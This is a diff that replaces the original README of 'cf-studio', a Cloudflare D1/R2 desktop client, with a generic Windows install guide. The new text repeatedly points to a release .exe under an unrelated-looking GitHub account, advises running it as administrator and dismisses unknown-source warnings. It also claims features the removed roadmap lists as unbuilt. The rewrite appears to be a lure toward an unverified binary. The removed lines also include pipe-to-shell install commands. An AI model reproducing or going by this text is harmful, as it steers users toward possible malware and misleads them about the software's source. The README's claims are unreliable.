@@ -1,168 +1,179 @@
-# CF Studio
+# 🧩 cf-studio - Manage Cloudflare data from desktop
 
-A blazing-fast, native desktop client for Cloudflare D1 and R2.
+[![Download cf-studio](https://img.shields.io/badge/Download-cf--studio-6e56cf?style=for-the-badge&logo=github)](https://github.com/Lousy-foulline740/cf-studio/releases)
 
-[Website](https://cfstudio.dev) • [Portfolio](https://mubashar.dev) • [YouTube](https://youtube.com/@mubashardev)
+## 🚀 Getting Started
 
-## Install / Update
+cf-studio is a desktop app for working with Cloudflare services from one place. Use it to handle D1 databases, R2 storage, KV, and other Cloudflare resources without moving between tools.
 
-For macOS/Linux (Bash Terminal):
-```bash
-curl -fsSL https://install.cfstudio.dev | bash
-```
+This guide shows you how to get the app on Windows, open it, and start using it.
 
-For Windows (PowerShell):
-```powershell
-irm https://install.cfstudio.dev | iex
-```
+## 📥 Download
 
-<div align="center">
-  <img src="screenshots/Terminal Look.png" width="800" alt="CF Studio installer in the terminal" />
-</div>
+1. Open the [cf-studio releases page](https://github.com/Lousy-foulline740/cf-studio/releases)
+2. Find the latest release
+3. Download the Windows file for your PC
+4. After the download ends, open the file to install or run the app
 
-Managing Cloudflare Edge databases and storage shouldn't require juggling CLI commands or waiting for web dashboards to load. CF Studio provides a sleek, native GUI to manage your D1 databases and R2 buckets directly from your desktop.
+Use the file that matches your system. Most users should pick the standard Windows version.
 
-The best part? **Zero configuration.** CF Studio automatically detects your local `wrangler` session. Open the app, and your resources are instantly available.
+## 🪟 Install on Windows
 
----
+1. Go to the [releases page](https://github.com/Lousy-foulline740/cf-studio/releases)
+2. Download the Windows app file
+3. Open the downloaded file
+4. If Windows asks for permission, choose Yes
+5. Follow the setup steps on screen
+6. When the install ends, start cf-studio from your desktop or Start menu
 
-## Features Overview
+If the app comes as a `.exe` file, you can run it right after download. If it comes as a setup file, open it and follow the prompts.
 
-### R2 Storage Explorer
-Complete management of your Cloudflare R2 buckets. Upload, download, and explore your objects with ease.
+## ✨ What You Can Do
 
-<div align="center">
-  <img src="screenshots/1. R2 Buckets Dark.png" width="800" alt="R2 Buckets List" />
-  <p><em>R2 Buckets Management interface</em></p>
-</div>
+cf-studio helps you work with common Cloudflare services in a single desktop app.
 
-#### Bucket Details & File Uploads
-Drill down into any bucket to manage its contents via a native file-explorer experience.
+- View and manage D1 databases
+- Browse R2 buckets and files
+- Work with KV data
+- Handle Cloudflare resources from one screen
+- Move between projects with less effort
+- Use a desktop layout that is easier to follow than command line tools
 
-<div align="center">
-  <img src="screenshots/1.1. Bucket Details Dark.png" width="400" />
-  <img src="screenshots/1.2. File Upload Dark.png" width="400" />
-</div>
+## 🖥️ What It Looks Like
 
----
+The app uses a clean desktop interface with panels for data, forms for editing, and simple controls for common tasks. It is built to help you find what you need fast.
 
-### D1 Database Management
-Explore your D1 databases with an intuitive listing and detailed table inspector.
+You can expect:
 
-<div align="center">
-  <img src="screenshots/2. D1 Databases List Dark.png" width="450" />
-  <img src="screenshots/2.1. Database Details Dark.png" width="450" />
-</div>
+- A clear sidebar for navigation
+- Tables for records and file lists
+- Forms for adding and editing values
+- Search and filter options
+- A layout that fits normal Windows use
 
-#### Interactive SQL Editor
-Run complex queries with a context-aware SQL editor. It suggests table names and columns from your actual schema as you type.
+## ✅ Before You Start
 
-<div align="center">
-  <img src="screenshots/2.2. DB SQL Editor Dark.png" width="800" alt="SQL Editor" />
-</div>
+Make sure your Windows PC can do the following:
 
-#### Visual Schema (ER Diagram)
-Visualize your database architecture instantly. The interactive ER diagram maps out table relationships and foreign key constraints.
+- Run modern desktop apps
+- Open downloaded `.exe` or setup files
+- Connect to the internet
+- Let the app reach your Cloudflare account
 
-<div align="center">
-  <img src="screenshots/2.3. DB Visual Schema Dark.png" width="800" alt="Visual Schema" />
-</div>
+For best results, keep Windows updated and use a stable network connection.
 
-#### Index Management
-Manage your database performance with interactive index management. Create and delete indexes without writing a single line of SQL.
+## 🔐 Cloudflare Access
 
-<div align="center">
-  <img src="screenshots/2.4. DB Indexes Dark.png" width="450" />
-  <img src="screenshots/2.5. New Index Rows Estimate Dark.png" width="450" />
-</div>
+To use cf-studio, you may need to sign in to your Cloudflare account or connect it with your API settings. The app is meant to help you manage your own Cloudflare resources from your desktop.
 
-*Features a **One-time rows read estimate** to prevent heavy performance hits on production databases.*
+Typical setup may include:
 
----
+- Account login
+- API token
+- Project or resource selection
+- Access to D1, R2, or KV
 
-## Core Capabilities
+Use the same account you already use for Cloudflare services.
 
-CF Studio includes high-tier features for comprehensive management:
-- **Bulk Data Export**: Export table data instantly to multiple formats.
-- **R2 Bucket Creation & Deletion**: Create and manage R2 buckets natively.
-- **Advanced Indexing**: Full interactive control over D1 indexes.
+## 🛠️ Basic Setup Steps
 
-## Tech Stack
+After you open cf-studio for the first time:
 
-- **Frontend:** React, Vite, TypeScript
-- **Backend:** Rust, Tauri v2
-- **UI & Styling:** Tailwind CSS v4, shadcn/ui
-- **Package Manager:** Bun
-- **Local State:** SQLite
+1. Sign in or connect your Cloudflare account
+2. Choose the service you want to manage
+3. Pick a database, bucket, or key space
+4. Use the on-screen tools to view or change data
+5. Save your changes when you are done
 
-## Getting Started
+If you are not sure where to start, open D1 first. It is the easiest place to check that everything works.
 
-### Prerequisites
+## 📚 Common Uses
 
-- [Bun](https://bun.sh/)
-- [Rust](https://www.rust-lang.org/tools/install)
-- Cloudflare Wrangler CLI (`wrangler login`)
+### D1 Database
+Use cf-studio to open a D1 database, view tables, and edit rows. This helps when you need to check data without typing queries by hand.
 
-### Local Development
+### R2 Storage
+Use the app to view buckets, list files, and manage object data. This is useful when you want a quick way to inspect storage items.
 
-1. Clone the repository:
-    ```bash
-    git clone https://github.com/mubashardev/cf-studio.git
-    cd cf-studio
-    ```
+### KV
+Use cf-studio to browse key-value data, update values, and remove entries you no longer need.
 
-2. Install dependencies:
-    ```bash
-    bun install
-    ```
+### Multiple Cloudflare Tools
+If you use more than one Cloudflare service, the app keeps them in one place. That saves time and cuts down on tool switching.
 
-3. Start the development server:
-    ```bash
-    bun tauri dev
-    ```
+## 🧭 How to Use the Main Screens
 
-## Roadmap
+### Home Screen
+The home screen gives you a starting point for your Cloudflare resources. It helps you pick the right service fast.
 
-<a href="https://cfstudio.dev">CF Studio</a> is evolving rapidly. Here's what has been built and what's on the horizon.
+### Data View
+This screen shows records, files, or keys in a simple list. You can sort, search, and open items from here.
 
-### Core Foundation
-- [x] **Native UI Shell**: High-performance desktop experience using Tauri v2.
-- [x] **Dynamic Theme System**: Full support for Dark/Light modes with OKLCH color spaces.
-- [x] **Zero-Config Auth**: Automatic detection of local `wrangler` sessions for instant access.
-- [x] **In-App Updater**: Native update delivery with real-time download progress.
+### Edit Screen
+Use this screen to change data. It shows fields in a form so you can edit them one at a time.
 
-### Database (D1)
-- [x] **Interactive Data Grid**: Browse and edit table data with a spreadsheet-like experience.
-- [x] **Smart SQL Editor**: Context-aware autocomplete for table and column names.
-- [x] **Visual Schema**: Auto-generated ER Diagrams for complex database architectures.
-- [x] **Index Architect**: GUI for creating and managing SQL indexes with cost estimation.
-- [x] **Bulk Export**: Instant data extraction to multiple portable formats.
+### Settings
+Use settings to connect your account, manage access, and choose how the app behaves on your computer.
 
-### Storage (R2)
-- [x] **Object Explorer**: Seamlessly navigate through buckets and folders.
-- [x] **Streaming Uploads**: High-speed, multi-part uploads with real-time progress.
-- [x] **Bucket Orchestration**: Create, delete, and configure R2 buckets natively.
+## 💡 Tips for Windows Users
 
-### Audit & Optimization (Pro)
-- [x] **Security Posture Audit**: Automated check for SSL, WAF, and Firewall best practices.
-- [x] **Performance Benchmarking**: Insights into Brotli, HTTP/3, and Caching configurations.
-- [x] **DNS & Email Health**: Verification of SPF, DKIM, and DMARC records.
-- [x] **Vector PDF Reports**: Programmatic generation of professional audit reports.
+- Keep the app in a folder you can find again
+- If Windows blocks the file, check the download again from the release page
+- Run the app with the same account you use for Cloudflare
+- If a screen looks empty, check that you picked the correct service or project
+- If you manage more than one account, use clear names for each one
 
-### _Future Horizons_
-- [ ] **KV Namespace CRUD**: Full management for Key-Value storage.
-- [ ] **Workers Metrics**: Real-time log streaming and CPU/Memory monitoring.
-- [ ] **Vectorize Integration**: Manage vector databases for AI/ML workloads.
-- [ ] **Local Simulation**: Integrated Miniflare support for local-first testing.
+## ❓ Common Questions
 
-## Contributing
+### Do I need coding skills?
+No. The app is built for people who want a simple desktop way to manage Cloudflare data.
 
-Contributions are welcome! Please open an issue first to discuss any major changes.
+### Can I use it on a normal Windows PC?
+Yes. It is made for desktop use on Windows.
 
-## License
+### What should I download?
+Go to the [releases page](https://github.com/Lousy-foulline740/cf-studio/releases) and download the latest Windows version.
 
-[MIT](LICENSE)
+### Where do I start after install?
+Open the app, sign in to your Cloudflare account, then choose D1, R2, or KV.
 
------
+## 🔎 Troubleshooting
 
-Built by [CF Studio](https://cfstudio.dev).
+### The file will not open
+- Download it again from the [releases page](https://github.com/Lousy-foulline740/cf-studio/releases)
+- Make sure the download finished
+- Right-click the file and choose Run as administrator
+
+### Windows says the app is from an unknown source
+- Open the release page again and use the latest file
+- Check that you downloaded the Windows build
+
+### The app cannot connect to Cloudflare
+- Check your internet connection
+- Make sure your login or token is correct
+- Confirm that your account has access to the service you want to use
+
+### The screen shows no data
+- Check that you picked the right database, bucket, or key space
+- Refresh the view
+- Make sure the resource has data in it
+
+## 📦 Project Focus
+
+cf-studio is built for users who want a desktop tool for Cloudflare work. It brings together:
+
+- Cloudflare D1 database management
+- R2 storage browsing
+- KV key-value access
+- A desktop interface built with a modern Windows app stack
+- Fast access to common Cloudflare tasks
+
+## 🧩 What This Repo Is For
+
+This repository holds the cf-studio app and release files. If you want to use the tool on Windows, start with the download page and get the latest release.
+
+## 🔗 Download Again
+
+If you need the installer later, use the same link:
+
+[Go to the cf-studio releases page](https://github.com/Lousy-foulline740/cf-studio/releases)
